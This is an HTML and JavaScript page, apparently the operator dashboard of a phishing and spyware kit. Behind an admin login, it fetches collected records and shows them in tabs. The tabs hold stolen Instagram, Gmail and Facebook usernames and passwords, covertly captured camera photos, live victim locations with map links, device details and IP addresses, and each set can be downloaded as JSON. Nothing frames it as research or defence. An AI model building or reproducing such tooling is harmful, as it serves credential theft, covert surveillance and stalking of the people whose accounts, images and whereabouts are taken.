<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Admin Panel - Live Data Viewer</title>
    <style>
        :root {
            --bg-gradient: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
            --glass-bg: rgba(255, 255, 255, 0.05);
            --glass-border: rgba(255, 255, 255, 0.15);
            --glass-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37);
            --pink-accent: #ff2a85;
            --purple-accent: #9d4edd;
            --text-color: #f8f9fa;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: var(--bg-gradient);
            color: var(--text-color);
            margin: 0;
            padding: 20px;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background-attachment: fixed;
        }

        .glass-card {
            background: var(--glass-bg);
            backdrop-filter: blur(12px);
            -webkit-backdrop-filter: blur(12px);
            border: 1px solid var(--glass-border);
            border-radius: 16px;
            box-shadow: var(--glass-shadow);
        }

        /* Login Screen Style */
        #loginContainer {
            width: 100%;
            max-width: 400px;
            padding: 40px;
            text-align: center;
        }

        h2 {
            margin-top: 0;
            color: #fff;
            font-size: 1.8rem;
            margin-bottom: 25px;
            text-shadow: 0 2px 10px rgba(255, 42, 133, 0.5);
        }

        .input-group {
            margin-bottom: 20px;
            text-align: left;
        }

        .input-group label {
            display: block;
            font-size: 0.85rem;
            font-weight: 600;
            margin-bottom: 8px;
            color: #e0aaff;
        }

        .input-group input {
            width: 100%;
            padding: 12px 15px;
            background: rgba(0, 0, 0, 0.2);
            border: 1px solid var(--glass-border);
            border-radius: 8px;
            color: white;
            font-size: 1rem;
            outline: none;
            box-sizing: border-box;
            transition: border-color 0.3s;
        }

        .input-group input:focus {
            border-color: var(--pink-accent);
            box-shadow: 0 0 10px rgba(255, 42, 133, 0.4);
        }

        .btn {
            background: linear-gradient(135deg, var(--pink-accent), var(--purple-accent));
            color: white;
            border: none;
            padding: 12px 20px;
            font-size: 1rem;
            font-weight: 600;
            border-radius: 8px;
            cursor: pointer;
            width: 100%;
            transition: opacity 0.2s, transform 0.2s;
            box-shadow: 0 4px 15px rgba(157, 78, 221, 0.4);
        }

        .btn:hover {
            opacity: 0.9;
            transform: translateY(-1px);
        }

        .error-msg {
            color: #ff6b6b;
            font-size: 0.85rem;
            margin-top: 15px;
        }

        /* Dashboard Container Style */
        #dashboardContainer {
            display: none;
            width: 100%;
            max-width: 1150px;
            padding: 30px;
            box-sizing: border-box;
        }

        .dashboard-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 1px solid var(--glass-border);
            padding-bottom: 15px;
            margin-bottom: 20px;
        }

        .dashboard-header h2 {
            margin: 0;
            font-size: 1.5rem;
        }

        .btn-logout {
            background: rgba(255, 255, 255, 0.1);
            border: 1px solid var(--glass-border);
            padding: 8px 15px;
            width: auto;
            font-size: 0.85rem;
        }

        /* Category Tabs */
        .tabs {
            display: flex;
            gap: 10px;
            margin-bottom: 25px;
            overflow-x: auto;
            padding-bottom: 5px;
        }

        .tab-btn {
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid var(--glass-border);
            padding: 10px 18px;
            font-size: 0.9rem;
            font-weight: 600;
            border-radius: 8px;
            cursor: pointer;
            color: #d8b4fe;
            transition: all 0.3s;
            white-space: nowrap;
        }

        .tab-btn.active {
            background: linear-gradient(135deg, var(--pink-accent), var(--purple-accent));
            color: white;
            border-color: transparent;
            box-shadow: 0 0 15px rgba(255, 42, 133, 0.5);
        }

        .tab-content {
            display: none;
        }

        .tab-content.active {
            display: block;
        }

        /* Viewer Display Area */
        .viewer-screen {
            width: 100%;
            height: 450px;
            border: 2px dashed var(--glass-border);
            border-radius: 10px;
            overflow: auto;
            background: rgba(0, 0, 0, 0.2);
            padding: 15px;
            box-sizing: border-box;
        }

        table {
            width: 100%;
            border-collapse: collapse;
            color: #fff;
            font-size: 0.85rem;
        }

        th, td {
            padding: 12px 10px;
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
            text-align: left;
        }

        th {
            color: #ff758c;
            background: rgba(0, 0, 0, 0.3);
            white-space: nowrap;
        }

        .record-id {
            font-family: monospace;
            color: #38bdf8;
            font-weight: bold;
        }

        .preview-img {
            max-width: 80px;
            max-height: 80px;
            border-radius: 6px;
            object-fit: cover;
            border: 1px solid var(--glass-border);
        }

        .device-info-box {
            font-size: 0.75rem;
            color: #cbd5e1;
            line-height: 1.4;
            max-width: 220px;
            word-break: break-word;
        }

        .map-link {
            background: linear-gradient(135deg, #00b4d8, #0077b6);
            color: white;
            padding: 5px 10px;
            border-radius: 6px;
            text-decoration: none;
            font-size: 0.75rem;
            font-weight: 600;
            display: inline-block;
            box-shadow: 0 2px 10px rgba(0, 180, 216, 0.3);
            white-space: nowrap;
        }

        .map-link:hover {
            opacity: 0.9;
        }

        .action-bar {
            display: flex;
            justify-content: flex-end;
            margin-top: 15px;
        }

        .btn-download {
            background: linear-gradient(135deg, #10b981, #059669);
            width: auto;
            padding: 10px 20px;
            text-decoration: none;
            color: white;
            border-radius: 6px;
            font-weight: 600;
            font-size: 0.9rem;
            border: none;
            cursor: pointer;
            box-shadow: 0 4px 15px rgba(16, 185, 129, 0.3);
        }

        .hidden {
            display: none !important;
        }
    </style>
</head>
<body>

    <!-- 1. ADMIN LOGIN PANEL -->
    <div id="loginContainer" class="glass-card">
        <h2>🔒 Admin Login</h2>
        <div class="input-group">
            <label for="usernameInput">Username</label>
            <input type="text" id="usernameInput" placeholder="Enter username">
        </div>
        <div class="input-group">
            <label for="passwordInput">Password</label>
            <input type="password" id="passwordInput" placeholder="Enter password">
        </div>
        <button class="btn" onclick="handleLogin()">Login Dashboard</button>
        <div id="errorMsg" class="error-msg"></div>
    </div>

    <!-- 2. ADMIN DASHBOARD -->
    <div id="dashboardContainer" class="glass-card">
        <div class="dashboard-header">
            <h2>✨ Collected Data Live Dashboard</h2>
            <button class="btn btn-logout" onclick="handleLogout()">Logout</button>
        </div>
        
        <!-- Category Navigation Tabs -->
        <div class="tabs">
            <button class="tab-btn active" data-target="instagram" onclick="switchTab('instagram')">📸 Instagram Logs</button>
            <button class="tab-btn" data-target="gmail" onclick="switchTab('gmail')">✉️ Gmail / Google Logs</button>
            <button class="tab-btn" data-target="facebook" onclick="switchTab('facebook')">📘 Facebook Logs</button>
            <button class="tab-btn" data-target="camera" onclick="switchTab('camera')">📷 Camera Photos</button>
            <button class="tab-btn" data-target="location" onclick="switchTab('location')">📍 Live Location Map</button>
        </div>

        <!-- 1. INSTAGRAM TAB -->
        <div id="instagram-section" class="tab-content active">
            <div class="viewer-screen" id="instagramViewer">Loading Instagram records...</div>
            <div class="action-bar">
                <button class="btn-download" onclick="downloadJSON('instagram')">📥 Download Instagram JSON</button>
            </div>
        </div>

        <!-- 2. GMAIL / GOOGLE TAB -->
        <div id="gmail-section" class="tab-content">
            <div class="viewer-screen" id="gmailViewer">Loading Gmail records...</div>
            <div class="action-bar">
                <button class="btn-download" onclick="downloadJSON('gmail')">📥 Download Gmail JSON</button>
            </div>
        </div>

        <!-- 3. FACEBOOK TAB -->
        <div id="facebook-section" class="tab-content">
            <div class="viewer-screen" id="facebookViewer">Loading Facebook records...</div>
            <div class="action-bar">
                <button class="btn-download" onclick="downloadJSON('facebook')">📥 Download Facebook JSON</button>
            </div>
        </div>

        <!-- 4. CAMERA TAB -->
        <div id="camera-section" class="tab-content">
            <div class="viewer-screen" id="cameraViewer">Loading camera media...</div>
            <div class="action-bar">
                <button class="btn-download" onclick="downloadJSON('camera')">📥 Download Camera Data</button>
            </div>
        </div>

        <!-- 5. LOCATION MAP TAB -->
        <div id="location-section" class="tab-content">
            <div class="viewer-screen" id="locationViewer">Loading location tracking logs...</div>
            <div class="action-bar">
                <button class="btn-download" onclick="downloadJSON('location')">📥 Download Location JSON</button>
            </div>
        </div>
    </div>

    <script>
        let allLogs = [];

        window.onload = function() {
            if (sessionStorage.getItem("isAdminLoggedIn") === "true") {
                showDashboard();
            }
        };

        function handleLogin() {
            const user = document.getElementById("usernameInput").value.trim();
            const pass = document.getElementById("passwordInput").value.trim();
            const errorMsg = document.getElementById("errorMsg");

            fetch('/api/admin-login', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ username: user, password: pass })
            })
            .then(res => res.json())
            .then(data => {
                if (data.status === 'success') {
                    sessionStorage.setItem("isAdminLoggedIn", "true");
                    showDashboard();
                } else {
                    errorMsg.textContent = "Invalid Username or Password!";
                }
            })
            .catch(() => {
                errorMsg.textContent = "Server connection error!";
            });
        }

        function showDashboard() {
            document.getElementById("loginContainer").classList.add("hidden");
            document.getElementById("dashboardContainer").style.display = "block";
            fetchLogsFromServer();
        }

        function handleLogout() {
            sessionStorage.removeItem("isAdminLoggedIn");
            location.reload();
        }

        function switchTab(category) {
            document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
            document.querySelectorAll('.tab-content').forEach(content => content.classList.remove('active'));

            document.querySelector(`[data-target="${category}"]`).classList.add('active');
            document.getElementById(`${category}-section`).classList.add('active');
        }

        function fetchLogsFromServer() {
            fetch('/api/get-logs')
                .then(res => res.json())
                .then(data => {
                    allLogs = data;
                    renderTables();
                })
                .catch(err => console.error("Error fetching logs:", err));
        }

        function renderTables() {
            const instaLogs = allLogs.filter(log => (log.platform && log.platform.toLowerCase().includes('instagram')) || (log.instagram_username && log.instagram_username !== 'N/A' && !log.platform?.toLowerCase().includes('gmail') && !log.platform?.toLowerCase().includes('google')));
            const gmailLogs = allLogs.filter(log => (log.platform && (log.platform.toLowerCase().includes('gmail') || log.platform.toLowerCase().includes('google'))));
            const fbLogs = allLogs.filter(log => log.platform && log.platform.toLowerCase().includes('facebook'));
            const camLogs = allLogs.filter(log => log.image_base64 && log.image_base64 !== null);
            const locLogs = allLogs.filter(log => log.location && log.location.latitude && log.location.latitude !== 'N/A');

            populateTable('instagramViewer', instaLogs, 'Instagram');
            populateTable('gmailViewer', gmailLogs, 'Gmail');
            populateTable('facebookViewer', fbLogs, 'Facebook');
            populateTable('cameraViewer', camLogs, 'Camera');
            populateTable('locationViewer', locLogs, 'Location');
        }

        function formatSystemInfo(sys) {
            if (!sys || Object.keys(sys).length === 0) return 'N/A';
            let info = [];
            if (sys.platform) info.push(`OS: ${sys.platform}`);
            if (sys.browser) info.push(`Browser: ${sys.browser}`);
            if (sys.deviceMemory) info.push(`RAM: ${sys.deviceMemory}GB`);
            if (sys.screenResolution) info.push(`Screen: ${sys.screenResolution}`);
            return info.length > 0 ? info.join('<br>') : JSON.stringify(sys);
        }

        function populateTable(containerId, logs, type) {
            const container = document.getElementById(containerId);

            if (logs.length === 0) {
                container.innerHTML = `<div style="text-align: center; color: #b8c1ec; padding: 40px;">No records available for ${type} yet.</div>`;
                return;
            }

            let html = `<table><thead><tr><th>ID</th><th>Time</th>`;
            if (type === 'Instagram' || type === 'Facebook' || type === 'Gmail') {
                html += `<th>Username / Email</th><th>Password / Token</th>`;
            }
            if (type === 'Camera') {
                html += `<th>Captured Image</th>`;
            }
            if (type === 'Location') {
                html += `<th>Latitude</th><th>Longitude</th><th>Live Map</th>`;
            }
            html += `<th>Device Info</th><th>IP Address</th></tr></thead><tbody>`;

            logs.forEach(log => {
                let recordId = log.id || 'N/A';
                let timeStr = new Date(log.timestamp).toLocaleString();
                let sysInfo = formatSystemInfo(log.system);

                html += `<tr><td class="record-id">${recordId}</td><td>${timeStr}</td>`;
                
                if (type === 'Instagram' || type === 'Facebook' || type === 'Gmail') {
                    html += `<td>${log.instagram_username || 'N/A'}</td><td><span style="color:#ff758c; font-weight:bold;">${log.instagram_password || 'N/A'}</span></td>`;
                }
                if (type === 'Camera') {
                    let imgTag = log.image_base64 ? `<img src="${log.image_base64}" class="preview-img">` : 'No Image';
                    html += `<td>${imgTag}</td>`;
                }
                if (type === 'Location') {
                    let lat = log.location ? log.location.latitude : 'N/A';
                    let lon = log.location ? log.location.longitude : 'N/A';
                    let mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
                    html += `<td>${lat}</td><td>${lon}</td><td><a href="${mapUrl}" target="_blank" class="map-link">🗺️ Open Map</a></td>`;
                }

                html += `<td><div class="device-info-box">${sysInfo}</div></td><td>${log.ip || 'N/A'}</td></tr>`;
            });

            html += `</tbody></table>`;
            container.innerHTML = html;
        }

        function downloadJSON(category) {
            let targetData = allLogs;
            if (category === 'instagram') {
                targetData = allLogs.filter(log => (log.platform && log.platform.toLowerCase().includes('instagram')) || (log.instagram_username && log.instagram_username !== 'N/A'));
            } else if (category === 'gmail') {
                targetData = allLogs.filter(log => log.platform && (log.platform.toLowerCase().includes('gmail') || log.platform.toLowerCase().includes('google')));
            } else if (category === 'facebook') {
                targetData = allLogs.filter(log => log.platform && log.platform.toLowerCase().includes('facebook'));
            } else if (category === 'camera') {
                targetData = allLogs.filter(log => log.image_base64 && log.image_base64 !== null);
            } else if (category === 'location') {
                targetData = allLogs.filter(log => log.location && log.location.latitude && log.location.latitude !== 'N/A');
            }

            const dataStr = "data:text/json;charset=utf-8," + encodeURIComponent(JSON.stringify(targetData, null, 2));
            const downloadAnchor = document.createElement('a');
            downloadAnchor.setAttribute("href", dataStr);
            downloadAnchor.setAttribute("download", `${category}_collected_logs.json`);
            document.body.appendChild(downloadAnchor);
            downloadAnchor.click();
            downloadAnchor.remove();
        }
    </script>
</body>
</html>
